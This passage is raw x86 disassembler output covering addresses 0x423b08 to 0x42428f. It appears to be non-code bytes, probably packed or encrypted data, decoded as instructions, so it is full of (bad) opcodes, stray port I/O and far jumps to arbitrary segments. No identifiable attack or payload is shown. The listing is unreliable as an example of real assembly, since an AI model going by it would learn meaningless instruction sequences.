  423b08:	mov    esi,esp
  423b0a:	cmp    eax,0x8cd13d4c
  423b0f:	jmp    0x423b5a
  423b11:	pop    edi
  423b12:	jmp    0xc074:0x2dbe3f62
  423b19:	mov    ebp,0xc745f63c
  423b1e:	mov    al,ds:0x6668d524
  423b24:	repz push ss
  423b26:	mov    ebp,0xfec748d6
  423b2b:	ins    BYTE PTR es:[edi],dx
  423b2c:	aas    
  423b2d:	jae    0x423b42
  423b2f:	sbb    ebx,DWORD PTR [esi-0x13c41dfb]
  423b35:	adc    al,0x6
  423b37:	aaa    
  423b38:	inc    esi
  423b39:	mov    dl,0xcf
  423b3b:	popa   
  423b3c:	xor    ch,BYTE PTR [ebx+0x63]
  423b3f:	(bad)  
  423b40:	fwait
  423b41:	pop    ecx
  423b42:	adc    esi,DWORD PTR [edi+0x48e6dd4b]
  423b48:	gs inc edi
  423b4a:	ror    ah,cl
  423b4c:	fisttp WORD PTR [edx]
  423b4e:	stos   DWORD PTR es:[edi],eax
  423b4f:	(bad)  
  423b50:	sti    
  423b51:	test   eax,0x64fd2d49
  423b56:	fisttp WORD PTR [ecx+0x6dd2320a]
  423b5c:	(bad)  
  423b5d:	sbb    al,BYTE PTR [eax-0x4f]
  423b60:	cli    
  423b61:	xor    BYTE PTR [edi+0x69],dl
  423b64:	mov    ecx,0x50222275
  423b69:	cwde   
  423b6a:	push   eax
  423b6b:	pop    es
  423b6c:	fcomp  QWORD PTR [edx-0x6a6eae8a]
  423b72:	fld    QWORD PTR [esi]
  423b74:	xchg   DWORD PTR [ebp-0x10430ce4],edx
  423b7a:	adc    BYTE PTR [edx+0x3],dh
  423b7d:	pop    ebp
  423b7e:	push   esi
  423b7f:	in     eax,dx
  423b80:	test   BYTE PTR [esi+edx*2-0x43],0x3e
  423b85:	rol    DWORD PTR [esp+ebx*8-0x4040e10],1
  423b8c:	retf   0xd384
  423b8f:	rcl    cl,0xbb
  423b92:	je     0x423ba3
  423b94:	test   DWORD PTR [edi-0x12],0x98c50cb8
  423b9b:	fisub  WORD PTR [ebp+0x72]
  423b9e:	inc    edi
  423b9f:	push   0x699ca1fb
  423ba4:	das    
  423ba5:	pop    ebp
  423ba6:	fwait
  423ba7:	jecxz  0x423b98
  423ba9:	stos   DWORD PTR es:[edi],eax
  423baa:	lods   eax,DWORD PTR ds:[esi]
  423bab:	gs pop edx
  423bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bae:	(bad)  
  423bb0:	in     eax,dx
  423bb1:	mov    dh,0x33
  423bb3:	xchg   esp,eax
  423bb4:	pushaw 
  423bb6:	test   eax,0xde5fd22a
  423bbb:	(bad)  
  423bbc:	add    BYTE PTR [edx],dh
  423bbe:	adc    ch,0x15
  423bc1:	xchg   ecx,eax
  423bc2:	inc    esi
  423bc3:	cmp    DWORD PTR [edi+0x711594f1],edx
  423bc9:	push   ss
  423bca:	rcl    BYTE PTR [ebx-0x78],1
  423bcd:	dec    ecx
  423bce:	mov    esp,0x4f317d6b
  423bd3:	ja     0x423b71
  423bd5:	dec    ecx
  423bd6:	xchg   esi,eax
  423bd7:	mov    esi,0xa7b63113
  423bdc:	retf   
  423bdd:	rcr    edi,0x12
  423be0:	mov    esi,0x64f4f380
  423be5:	xchg   ebp,eax
  423be6:	mov    eax,0x30e063ac
  423beb:	push   esi
  423bec:	daa    
  423bed:	ret    0x7607
  423bf0:	mov    eax,0xa7635e20
  423bf5:	loop   0x423bd6
  423bf7:	retf   
  423bf8:	fdivr  DWORD PTR [edx-0x2b2d865e]
  423bfe:	xor    cl,BYTE PTR [edi]
  423c00:	xchg   ebp,eax
  423c01:	sbb    dh,dl
  423c03:	scas   eax,DWORD PTR es:[edi]
  423c04:	ins    BYTE PTR es:[edi],dx
  423c05:	loopne 0x423c43
  423c07:	adc    eax,0x715238e8
  423c0c:	das    
  423c0d:	fdivrp st(1),st
  423c0f:	add    ch,BYTE PTR ds:0x2a77c484
  423c15:	sar    BYTE PTR [esi+0x4ee1ddd4],1
  423c1b:	mov    BYTE PTR [esi],dl
  423c1d:	outs   dx,BYTE PTR ds:[esi]
  423c1e:	add    BYTE PTR [edi],dh
  423c20:	mov    ds:0xb509ebee,eax
  423c25:	jne    0x423c16
  423c27:	sbb    eax,0xd6361f13
  423c2c:	sbb    BYTE PTR [edx+ebp*1+0x59],dl
  423c30:	pushf  
  423c31:	int3   
  423c32:	or     esi,edx
  423c34:	shl    esi,cl
  423c36:	cmp    eax,DWORD PTR [esi]
  423c38:	(bad)  
  423c39:	rcr    BYTE PTR [ecx+esi*1-0x11],1
  423c3d:	stos   DWORD PTR es:[edi],eax
  423c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c3f:	sub    esi,DWORD PTR [edx+0x40cff4a6]
  423c45:	pop    ebp
  423c46:	retf   0x4e2
  423c49:	outs   dx,BYTE PTR ds:[esi]
  423c4a:	jl     0x423cbe
  423c4c:	test   BYTE PTR [ecx],0xc0
  423c4f:	in     al,dx
  423c50:	lods   al,BYTE PTR ds:[esi]
  423c51:	push   ds
  423c52:	sti    
  423c53:	pop    ss
  423c54:	lahf   
  423c55:	add    eax,DWORD PTR [edx]
  423c57:	out    dx,eax
  423c58:	xchg   esi,eax
  423c59:	push   cs
  423c5a:	shr    DWORD PTR [edx],1
  423c5c:	or     esi,0x8
  423c5f:	dec    esi
  423c60:	lea    esi,[eax+0x14]
  423c63:	arpl   ax,di
  423c65:	test   al,0xcc
  423c67:	dec    edi
  423c68:	daa    
  423c69:	xchg   ebx,eax
  423c6a:	push   esi
  423c6b:	push   eax
  423c6c:	adc    DWORD PTR [esi-0x77],edx
  423c6f:	jne    0x423cce
  423c71:	jmp    0x423c1f
  423c73:	scas   eax,DWORD PTR es:[edi]
  423c74:	imul   ebx,eax,0xa80c1510
  423c7a:	adc    eax,ecx
  423c7c:	inc    esp
  423c7d:	mov    ds:0xc460794d,al
  423c82:	dec    esp
  423c83:	stc    
  423c84:	aad    0xbe
  423c86:	mov    bh,0x2c
  423c88:	pusha  
  423c89:	icebp  
  423c8a:	dec    edi
  423c8b:	lock stos BYTE PTR es:[edi],al
  423c8d:	cmp    BYTE PTR [ecx],bl
  423c8f:	and    eax,0x9a8ba463
  423c94:	bound  eax,QWORD PTR [esi-0x5d264594]
  423c9a:	xchg   edx,eax
  423c9b:	or     ah,BYTE PTR [ebp+0x2828ebba]
  423ca1:	jle    0x423c3d
  423ca3:	in     eax,dx
  423ca4:	pushf  
  423ca5:	out    0x64,al
  423ca7:	popf   
  423ca8:	xor    al,0xcf
  423caa:	sbb    esp,edi
  423cac:	iret   
  423cad:	or     esi,ebp
  423caf:	lock push ecx
  423cb1:	call   0xee62:0x35e32067
  423cb8:	stc    
  423cb9:	ret    0x3826
  423cbc:	icebp  
  423cbd:	fst    DWORD PTR [edx-0x68]
  423cc0:	dec    edx
  423cc1:	daa    
  423cc2:	or     ebp,DWORD PTR [ebx+0x76]
  423cc5:	fdiv   QWORD PTR [eax]
  423cc7:	cmp    BYTE PTR [edx-0x69],ah
  423cca:	mov    esp,0x9e57b1ba
  423ccf:	popf   
  423cd0:	fld    QWORD PTR [ecx-0x19]
  423cd3:	jmp    DWORD PTR gs:[eax]
  423cd6:	and    al,0x48
  423cd8:	daa    
  423cd9:	scas   eax,DWORD PTR es:[edi]
  423cda:	cld    
  423cdb:	xchg   BYTE PTR [esi+0x79],dh
  423cde:	mov    edi,DWORD PTR [ecx]
  423ce0:	js     0x423cd9
  423ce2:	or     ebx,DWORD PTR [edi-0x7e1b1816]
  423ce8:	lock mov eax,ds:0x1ee6d387
  423cef:	adc    al,0x5c
  423cf1:	push   ebx
  423cf2:	jle    0x423d26
  423cf4:	vpsrld ymm3,ymm2,XMMWORD PTR [ebx]
  423cf8:	inc    eax
  423cf9:	mov    al,BYTE PTR [esi+eax*4-0x426adbd]
  423d00:	adc    al,0x46
  423d02:	push   ebp
  423d03:	push   esp
  423d04:	ds xchg esp,eax
  423d06:	test   al,0x7a
  423d08:	test   al,0x3d
  423d0a:	(bad)  
  423d0b:	cld    
  423d0c:	ja     0x423cc4
  423d0e:	inc    edi
  423d0f:	and    ebp,DWORD PTR [esi-0x3]
  423d12:	push   0xec4224b1
  423d17:	add    al,BYTE PTR [eax]
  423d19:	ror    BYTE PTR [ebp-0x70],1
  423d1c:	xor    bh,BYTE PTR [edx+0x6d36bf7b]
  423d22:	lock jmp 0x3e0d9a65
  423d28:	push   ds
  423d29:	pop    edi
  423d2a:	call   0xee7f:0x1599a976
  423d31:	stos   DWORD PTR es:[edi],eax
  423d32:	and    BYTE PTR [ecx],bh
  423d34:	mov    edi,0x2369d44
  423d39:	imul   DWORD PTR [ebx+0x69e9e175]
  423d3f:	pop    esi
  423d40:	(bad)  
  423d41:	dec    esp
  423d42:	ins    DWORD PTR es:[edi],dx
  423d43:	adc    BYTE PTR [ecx],cl
  423d45:	repnz or bl,bl
  423d48:	jp     0x423cea
  423d4a:	push   edx
  423d4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d4c:	imul   eax,edi,0xdf8d3e44
  423d52:	or     DWORD PTR [edx+ecx*2],ebx
  423d55:	pushf  
  423d56:	or     al,0x97
  423d58:	fcmovu st,st(2)
  423d5a:	and    eax,0xffffffaf
  423d5d:	ficom  DWORD PTR [ecx-0x30]
  423d60:	push   cs
  423d61:	and    al,0x5b
  423d63:	dec    ecx
  423d64:	or     DWORD PTR [eax],0x727c36ab
  423d6a:	add    al,0x53
  423d6c:	jp     0x423d55
  423d6e:	inc    ebp
  423d6f:	xchg   esi,eax
  423d70:	cmp    dh,BYTE PTR [eax+edi*4-0x6a]
  423d74:	arpl   WORD PTR [edi],ax
  423d76:	push   edx
  423d77:	shr    BYTE PTR [edx+0x4de67841],cl
  423d7d:	mov    ah,0x64
  423d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d80:	inc    esp
  423d81:	outs   dx,BYTE PTR ds:[esi]
  423d82:	lods   eax,DWORD PTR ds:[esi]
  423d83:	ror    BYTE PTR [esi-0x795b04f2],1
  423d89:	lds    edx,FWORD PTR [ecx+esi*2]
  423d8c:	jo     0x423d7e
  423d8e:	mov    eax,DWORD PTR [ebp+0x241e6372]
  423d94:	xor    eax,0xb992bf1f
  423d99:	fdiv   QWORD PTR [eax]
  423d9b:	and    DWORD PTR [edi-0x17],0xf1852d1
  423da2:	pop    ebp
  423da3:	test   DWORD PTR [bx+si+0x1bd2],edi
  423da8:	(bad)  
  423da9:	or     edx,DWORD PTR [ebx-0x38]
  423dac:	or     bl,BYTE PTR [ebx]
  423dae:	xchg   ebx,eax
  423daf:	lds    ecx,FWORD PTR [eax]
  423db1:	mov    ebp,0xa3a36418
  423db6:	dec    ecx
  423db7:	add    BYTE PTR [edx-0x3f],0xe7
  423dbb:	mov    bh,0x10
  423dbd:	jge    0x423d48
  423dbf:	jne    0x423d6f
  423dc1:	add    BYTE PTR [ecx+0x4a],bl
  423dc4:	into   
  423dc5:	out    0x59,al
  423dc7:	clc    
  423dc8:	pop    ebp
  423dc9:	mov    DWORD PTR [eax],edi
  423dcb:	push   0x70d0e4a6
  423dd0:	stos   DWORD PTR es:[edi],eax
  423dd1:	and    DWORD PTR [esi+0x45],ecx
  423dd4:	pop    edi
  423dd5:	sub    bl,BYTE PTR [ecx+0x2e]
  423dd8:	xor    eax,0x23520d51
  423ddd:	iret   
  423dde:	in     al,0x79
  423de0:	(bad)  
  423de2:	cmp    eax,0xd2a0bfd0
  423de7:	cmp    dh,BYTE PTR [edi-0x75]
  423dea:	enter  0xa571,0x12
  423dee:	xchg   esi,eax
  423def:	pop    esi
  423df0:	push   ds
  423df1:	outs   dx,BYTE PTR ds:[esi]
  423df2:	cmp    esi,esp
  423df4:	mov    ecx,0xc3aff658
  423df9:	fistp  QWORD PTR ss:[esi+0x38f0260e]
  423e00:	mov    DWORD PTR [ecx-0x4c],ebp
  423e03:	mov    dl,0x98
  423e05:	loop   0x423db5
  423e07:	das    
  423e08:	dec    ebx
  423e09:	mov    esi,0x76a8cdd1
  423e0e:	add    cl,cl
  423e10:	pushf  
  423e11:	mul    BYTE PTR [esp+ebp*1+0x4d334de7]
  423e18:	mov    ebx,0xed2b330
  423e1d:	stos   DWORD PTR es:[edi],eax
  423e1e:	(bad)  
  423e1f:	pusha  
  423e20:	iret   
  423e21:	jb     0x423e6b
  423e23:	pop    ss
  423e24:	fsubrp st(5),st
  423e26:	xchg   ebx,eax
  423e27:	out    0x15,eax
  423e29:	lea    ebp,[edi]
  423e2b:	add    esi,0xd0af604f
  423e31:	push   eax
  423e32:	prefetcht0 BYTE PTR [ecx-0x5]
  423e36:	mov    ds:0xde3a866f,al
  423e3b:	fsubr  QWORD PTR [edx+0x60c30895]
  423e41:	cld    
  423e42:	mov    dl,BYTE PTR [ecx+0x4b]
  423e45:	jne    0x423e64
  423e47:	int    0x73
  423e49:	push   ebx
  423e4a:	popf   
  423e4b:	add    BYTE PTR [ebx+0x77],0x9b
  423e4f:	ss pusha 
  423e51:	cmp    eax,0xcd7447b6
  423e56:	popf   
  423e57:	sti    
  423e58:	add    dh,dh
  423e5a:	mov    ds:0xeead3492,eax
  423e5f:	rcl    BYTE PTR [eax-0x35],0x4b
  423e63:	or     ecx,esi
  423e65:	scas   al,BYTE PTR es:[edi]
  423e66:	xor    ecx,DWORD PTR [ecx+0x54ab1fe8]
  423e6c:	idiv   DWORD PTR [edi+0x3fda2682]
  423e72:	push   cs
  423e73:	dec    esi
  423e74:	popa   
  423e75:	fstp   QWORD PTR [edx-0x439d8764]
  423e7b:	push   ds
  423e7c:	and    bh,BYTE PTR [ecx-0x3869f331]
  423e82:	xchg   esi,eax
  423e83:	inc    ebp
  423e84:	jbe    0x423eea
  423e86:	vandnps xmm2,xmm4,XMMWORD PTR [esi+0x2ffdb623]
  423e8e:	les    esp,FWORD PTR [ebx+0x1]
  423e91:	pop    edi
  423e92:	or     eax,0x722e19a4
  423e97:	add    cl,BYTE PTR [edx+0x40281340]
  423e9d:	call   0xb80d6822
  423ea2:	sar    ecx,cl
  423ea4:	add    dh,dh
  423ea6:	ins    DWORD PTR es:[edi],dx
  423ea7:	fst    DWORD PTR [ecx]
  423ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423eaa:	std    
  423eab:	retf   
  423eac:	arpl   WORD PTR [ecx+0x3e371b7],bp
  423eb2:	outs   dx,DWORD PTR ds:[esi]
  423eb3:	adc    ch,ah
  423eb5:	and    cl,BYTE PTR [edx-0x6131b418]
  423ebb:	jp     0x423f2b
  423ebd:	dec    ecx
  423ebe:	sub    al,0x4d
  423ec0:	fisub  WORD PTR [ecx+0x57]
  423ec3:	in     al,dx
  423ec4:	or     DWORD PTR [edi-0x52],0xffffffcb
  423ec8:	jp     0x423edb
  423eca:	fisttp QWORD PTR [esi+0xfe23f]
  423ed0:	inc    ecx
  423ed1:	xchg   BYTE PTR [eax+edx*4-0x71],al
  423ed5:	mov    dh,0xc6
  423ed7:	xor    bh,ch
  423ed9:	stos   DWORD PTR es:[edi],eax
  423eda:	sbb    DWORD PTR [ebx+0x5c],0x2c301b48
  423ee1:	ins    BYTE PTR es:[edi],dx
  423ee2:	dec    edx
  423ee3:	inc    esp
  423ee4:	mov    ds:0x7487a969,al
  423ee9:	dec    eax
  423eea:	xlat   BYTE PTR ds:[ebx]
  423eeb:	cmp    ch,ah
  423eed:	fbstp  TBYTE PTR [edx-0x7]
  423ef0:	sub    ah,BYTE PTR [ebx+0x7e]
  423ef3:	jl     0x423f06
  423ef5:	dec    edi
  423ef6:	sbb    ch,BYTE PTR [ebx]
  423ef8:	dec    eax
  423ef9:	scas   al,BYTE PTR es:[edi]
  423efa:	pushf  
  423efb:	push   ebx
  423efc:	jns    0x423f37
  423efe:	shr    BYTE PTR [esi],0x2d
  423f01:	push   ebx
  423f02:	or     BYTE PTR [esi-0x69ae777d],0x40
  423f09:	mov    BYTE PTR [edi-0x1d],ch
  423f0c:	sti    
  423f0d:	pop    esi
  423f0e:	push   0xffffffe8
  423f10:	xchg   ebp,eax
  423f11:	ds jbe 0x423f51
  423f14:	mov    eax,0x452dc444
  423f19:	jb     0x423f6e
  423f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f1c:	call   ebp
  423f1e:	mov    ebp,DWORD PTR [esi+0x54d99c96]
  423f24:	xchg   esi,eax
  423f25:	mov    ds:0x47b6b5ce,al
  423f2a:	icebp  
  423f2b:	mov    eax,0x2d2b6341
  423f30:	dec    edi
  423f31:	into   
  423f32:	xor    BYTE PTR [edx+0x6cf7ebf2],dh
  423f38:	jle    0x423f11
  423f3a:	dec    ebp
  423f3b:	rol    ebp,cl
  423f3d:	jp     0x423eee
  423f3f:	jl     0x423f2d
  423f41:	mov    ebp,0xf6dd1a4c
  423f46:	and    ah,BYTE PTR [edi-0x16c96fdf]
  423f4c:	in     eax,0x6a
  423f4e:	jmp    0x8d30:0x14f0a48f
  423f55:	push   es
  423f56:	imul   esp,esi,0x0
  423f59:	xor    eax,0x30823c16
  423f5e:	call   0xc1ddd0ba
  423f63:	shr    BYTE PTR [ebp+0x12],cl
  423f66:	call   0x150ea9ac
  423f6b:	fild   WORD PTR [esi+0x103a4ef0]
  423f71:	jg     0x423f1b
  423f73:	pop    ds
  423f74:	nop
  423f75:	pop    ecx
  423f76:	sub    DWORD PTR [ebp+0xa868aa5],esp
  423f7c:	div    esi
  423f7e:	push   ebp
  423f7f:	inc    edx
  423f80:	loopne 0x423f99
  423f82:	add    dh,BYTE PTR [ebx+0x73]
  423f85:	rcr    edx,1
  423f87:	shl    DWORD PTR [esi+0x19],cl
  423f8a:	dec    ecx
  423f8b:	rol    DWORD PTR [esi+0x23f767cc],0x3e
  423f92:	loopne 0x423f7e
  423f94:	(bad)  
  423f95:	cwde   
  423f96:	adc    edi,DWORD PTR [edi+0x14]
  423f99:	std    
  423f9a:	lods   eax,DWORD PTR ds:[esi]
  423f9b:	jb     0x423ff3
  423f9d:	sbb    ebx,DWORD PTR [eax]
  423f9f:	mov    ah,0x9a
  423fa1:	(bad)  
  423fa2:	stos   DWORD PTR es:[edi],eax
  423fa3:	pop    ds
  423fa4:	pushf  
  423fa5:	push   ebp
  423fa6:	adc    bl,dl
  423fa8:	(bad)  
  423fa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423faa:	pop    ss
  423fab:	sbb    ch,BYTE PTR [edi-0x58]
  423fae:	sub    dl,ch
  423fb0:	sub    bh,BYTE PTR [ecx+esi*8-0x5e472260]
  423fb7:	mov    bl,0x4f
  423fb9:	stos   DWORD PTR es:[edi],eax
  423fba:	sub    BYTE PTR [edi+0xf],cl
  423fbd:	pop    edx
  423fbe:	push   ds
  423fbf:	dec    esp
  423fc0:	mov    BYTE PTR [eax-0x60cbe1ad],cl
  423fc6:	sbb    BYTE PTR [esi-0x3c0f2562],dh
  423fcc:	retf   0xba9f
  423fcf:	cmc    
  423fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fd1:	mov    ds,WORD PTR [ecx+0x69]
  423fd4:	push   edx
  423fd5:	adc    BYTE PTR [eax],al
  423fd7:	rcl    DWORD PTR [ebx-0x555d3304],1
  423fdd:	lods   eax,DWORD PTR ds:[esi]
  423fde:	jne    0x423f74
  423fe0:	rcl    BYTE PTR [ecx+0x7a],cl
  423fe3:	add    eax,0x19896611
  423fe8:	sbb    eax,0x196696f4
  423fed:	xor    BYTE PTR [esi-0x13],cl
  423ff0:	mov    esi,0xa1232fc4
  423ff5:	data16 jg 0x423ff8
  423ff8:	test   BYTE PTR [esp+ebp*4+0x18],bl
  423ffc:	inc    esp
  423ffd:	dec    ebx
  423ffe:	les    ecx,FWORD PTR [eax-0x71759608]
  424004:	sbb    ah,BYTE PTR [eax+esi*2-0x27]
  424008:	inc    eax
  424009:	test   esp,esi
  42400b:	push   es
  42400c:	and    al,0xa0
  42400e:	enter  0xadb2,0xd9
  424012:	ficomp DWORD PTR [ebx]
  424014:	mov    esp,0x8ce8fa01
  424019:	push   ecx
  42401a:	inc    esi
  42401b:	outs   dx,DWORD PTR ds:[esi]
  42401c:	jne    0x42404c
  42401e:	pop    edx
  42401f:	ins    BYTE PTR es:[edi],dx
  424020:	and    dl,BYTE PTR [ebp+edx*8+0x6]
  424024:	das    
  424025:	push   ebx
  424026:	scas   eax,DWORD PTR es:[edi]
  424027:	retf   
  424028:	inc    esi
  424029:	mov    ah,ah
  42402b:	enter  0xf4c9,0x6
  42402f:	shl    DWORD PTR [ecx+eiz*8-0x49],cl
  424033:	lods   al,BYTE PTR ds:[esi]
  424034:	retf   0x1b20
  424037:	hlt    
  424038:	arpl   WORD PTR [ebx-0xf],cx
  42403b:	loopne 0x42404f
  42403d:	popf   
  42403e:	test   esp,ebx
  424040:	cs popf 
  424042:	popa   
  424043:	dec    ebx
  424044:	mov    ebx,0x5881443d
  424049:	mov    esp,0xeff35fdc
  42404e:	in     al,0x6b
  424050:	repnz aas 
  424052:	scas   al,BYTE PTR es:[edi]
  424053:	shr    DWORD PTR [edi+0x28],0x65
  424057:	rcl    dh,1
  424059:	dec    ebp
  42405a:	xlat   BYTE PTR ds:[ebx]
  42405b:	mov    cl,0xc6
  42405d:	loopne 0x4240dd
  42405f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424060:	cmc    
  424061:	mov    bh,0xfc
  424063:	in     al,dx
  424064:	imul   esi,esi,0xffffffba
  424067:	add    bl,BYTE PTR [ebx-0x33]
  42406a:	push   0xa89a70c5
  42406f:	xchg   ecx,eax
  424070:	jmp    DWORD PTR [ecx+0x67]
  424073:	add    al,0x8b
  424075:	mov    al,0xe
  424077:	jg     0x4240ca
  424079:	mov    ebp,0xbc333a8c
  42407e:	cmc    
  42407f:	ins    DWORD PTR es:[edi],dx
  424080:	push   ebp
  424081:	je     0x4240b8
  424083:	outs   dx,BYTE PTR ds:[esi]
  424084:	in     al,dx
  424085:	pop    edx
  424086:	std    
  424087:	jmp    0x424087
  424089:	(bad)  
  42408a:	lds    ebp,FWORD PTR [ebp-0x3a]
  42408d:	pop    edi
  42408e:	pop    eax
  42408f:	pop    esp
  424091:	outs   dx,DWORD PTR ds:[esi]
  424092:	enter  0xb528,0xa0
  424096:	mov    ebx,0x606b31d0
  42409b:	xor    esp,DWORD PTR [ebp-0x67]
  42409e:	psubsb mm7,mm5
  4240a1:	cwde   
  4240a2:	fnstsw WORD PTR [ebx]
  4240a4:	(bad)  
  4240a5:	mov    DWORD PTR [edi-0x6d25d4f1],0x113c9314
  4240af:	jne    0x424123
  4240b1:	and    dl,ch
  4240b3:	fisubr WORD PTR [eax+0x6eb48a13]
  4240b9:	das    
  4240ba:	pop    edx
  4240bb:	dec    esp
  4240bc:	pop    edx
  4240bd:	jmp    0xbe6e1cf6
  4240c2:	pusha  
  4240c3:	mov    DWORD PTR [esi-0x54],edi
  4240c6:	(bad)  
  4240c7:	daa    
  4240c8:	sub    eax,0x30e0b7a1
  4240cd:	cld    
  4240ce:	dec    ebx
  4240cf:	cli    
  4240d0:	jb     0x4240af
  4240d2:	xor    bl,ch
  4240d4:	enter  0x859d,0xd9
  4240d8:	aas    
  4240d9:	pop    ds
  4240da:	sbb    eax,0x8984c592
  4240df:	xor    esp,edx
  4240e1:	push   ss
  4240e2:	or     al,0x59
  4240e4:	cmp    al,cl
  4240e6:	add    dl,BYTE PTR [esi]
  4240e8:	cmp    dl,BYTE PTR [ebx+0x19eda4c1]
  4240ee:	inc    ebp
  4240ef:	dec    edx
  4240f0:	push   ss
  4240f1:	and    cl,BYTE PTR [ebp-0x6]
  4240f4:	test   BYTE PTR [ebp-0x71],dh
  4240f7:	mov    ds,WORD PTR [esi]
  4240f9:	iret   
  4240fa:	xchg   edx,eax
  4240fb:	pop    edx
  4240fc:	ins    BYTE PTR es:[edi],dx
  4240fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240fe:	adc    DWORD PTR [ebp-0x30],ebp
  424101:	dec    esi
  424102:	lods   al,BYTE PTR ds:[esi]
  424103:	fbld   TBYTE PTR [esi+ecx*1+0x2b]
  424107:	push   esi
  424108:	loope  0x4240a4
  42410a:	enter  0xf589,0xb2
  42410e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42410f:	cmp    BYTE PTR [eax],dh
  424111:	bound  ebp,QWORD PTR [eax]
  424113:	or     DWORD PTR [ebp+0x4ae4fde8],edx
  424119:	(bad)  
  42411a:	cld    
  42411b:	jg     0x424159
  42411d:	popa   
  42411e:	xor    eax,0x6c00fac0
  424123:	jmp    0x79cdddfb
  424128:	xor    esi,DWORD PTR [esi-0xf89184d]
  42412e:	gs jge 0x424197
  424131:	push   esi
  424132:	cmp    cl,al
  424134:	dec    edi
  424135:	out    0x86,eax
  424137:	cdq    
  424138:	fnstenv [edx-0x738a349c]
  42413e:	das    
  42413f:	stos   BYTE PTR es:[edi],al
  424140:	les    edi,FWORD PTR [ebp+ebx*2+0x32c9319c]
  424147:	push   eax
  424149:	sub    DWORD PTR [eax+0x1e],esi
  42414c:	mov    esi,0x3132c2f9
  424151:	icebp  
  424152:	rcr    DWORD PTR [ebx],1
  424154:	in     al,dx
  424155:	mov    bh,0x7a
  424157:	les    edx,FWORD PTR [ebx]
  424159:	call   0xcc6176a8
  42415e:	jne    0x4240e2
  424160:	add    DWORD PTR [esp+ecx*2],0x75dc02e7
  424167:	or     al,0xd
  424169:	stos   BYTE PTR es:[edi],al
  42416a:	dec    esi
  42416b:	xchg   BYTE PTR [edx],bl
  42416d:	jl     0x4240f9
  42416f:	xor    al,0x83
  424171:	adc    ebx,DWORD PTR [eax]
  424173:	outs   dx,BYTE PTR ds:[esi]
  424174:	scas   eax,DWORD PTR es:[edi]
  424175:	push   esp
  424176:	sbb    eax,0x804606f5
  42417b:	jo     0x42419c
  42417d:	inc    ebp
  42417e:	loope  0x424195
  424180:	sub    al,dl
  424182:	sub    al,0xc9
  424184:	stc    
  424185:	mov    ebp,0x9e089498
  42418a:	adc    cl,BYTE PTR [eax-0x2207eed9]
  424190:	or     eax,0xca8043dd
  424195:	int3   
  424196:	ds std 
  424198:	push   ds
  424199:	clc    
  42419a:	es es and eax,0x7b8ee71a
  4241a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241a2:	dec    ebp
  4241a3:	adc    eax,0x58b48d6b
  4241a8:	pop    edi
  4241a9:	pop    ds
  4241aa:	adc    eax,0x1eed4fad
  4241af:	add    DWORD PTR ds:0x7fbd9ac4,esi
  4241b5:	mov    ecx,0x51edaeb3
  4241ba:	xor    eax,0x636e7ec7
  4241bf:	mov    eax,0x41467c1e
  4241c4:	xchg   ebx,eax
  4241c5:	xor    ch,bh
  4241c7:	cmc    
  4241c8:	push   eax
  4241c9:	dec    eax
  4241ca:	jbe    0x42419e
  4241cc:	outs   dx,BYTE PTR ds:[esi]
  4241cd:	xor    al,0x81
  4241cf:	fs pop esp
  4241d1:	xchg   edx,eax
  4241d2:	aas    
  4241d3:	dec    eax
  4241d4:	mov    edx,0xf5230a1f
  4241d9:	xchg   esp,eax
  4241da:	push   0xd65809cd
  4241df:	imul   edi,DWORD PTR [esi+0x8],0x9bac7e55
  4241e6:	pusha  
  4241e7:	jg     0x424236
  4241e9:	xchg   ebp,eax
  4241ea:	icebp  
  4241eb:	jns    0x42423a
  4241ed:	cmp    cl,bh
  4241ef:	(bad)  [esi+0x1c]
  4241f2:	fcomp  st(7)
  4241f4:	sqrtps xmm1,xmm2
  4241f7:	dec    ebp
  4241f8:	clc    
  4241f9:	fsubr  DWORD PTR [esi-0x4221fd5f]
  4241ff:	sub    BYTE PTR [esi-0x72],dl
  424202:	call   0xfec5:0xee7fac42
  424209:	not    esi
  42420b:	pop    edx
  42420c:	pop    esi
  42420d:	adc    dh,dl
  42420f:	dec    edi
  424210:	mov    edi,0x852e4860
  424215:	push   ss
  424216:	das    
  424217:	inc    ecx
  424218:	das    
  424219:	ja     0x4241e6
  42421b:	fnstsw WORD PTR [esi]
  42421d:	int    0xc5
  42421f:	fwait
  424220:	push   ebp
  424221:	loope  0x424200
  424223:	adc    ah,BYTE PTR [ecx]
  424225:	push   ebx
  424226:	aam    0x2
  424228:	pop    ds
  424229:	es icebp 
  42422b:	sub    bl,BYTE PTR [esi-0x21]
  42422e:	out    0x84,eax
  424230:	sub    DWORD PTR [edx+edi*8+0x58],eax
  424234:	aad    0x4a
  424236:	or     dl,BYTE PTR [edx+0x45]
  424239:	inc    ebx
  42423a:	jg     0x424231
  42423c:	aas    
  42423d:	jle    0x4241ca
  42423f:	ins    BYTE PTR es:[edi],dx
  424240:	idiv   DWORD PTR [esi+0x56145f26]
  424246:	pop    ebp
  424247:	pcmpeqd mm6,mm3
  42424a:	stos   BYTE PTR es:[edi],al
  42424b:	and    al,0x79
  42424d:	es mov edi,0x4ab841c1
  424253:	(bad)  
  424254:	into   
  424255:	ret    0xa702
  424258:	dec    edx
  424259:	mov    DWORD PTR [edx+0x30],esp
  42425c:	add    dl,bl
  42425e:	iret   
  42425f:	fwait
  424260:	and    cl,BYTE PTR [esp+eiz*2-0x4955f4ef]
  424267:	adc    BYTE PTR [ebx-0x30],ch
  42426a:	sub    bl,BYTE PTR [esp+ebx*2]
  42426d:	imul   edi,esp,0xc
  424270:	jge    0x4242db
  424272:	push   0x53
  424274:	pop    esp
  424275:	adc    eax,0xc6a17147
  42427a:	repnz scas al,BYTE PTR es:[edi]
  42427c:	jl     0x424288
  42427e:	popa   
  42427f:	test   BYTE PTR ds:0x277f3df1,dl
  424285:	call   0x7f59:0xf3953640
  42428c:	retf   0x277a
  42428f:	std    
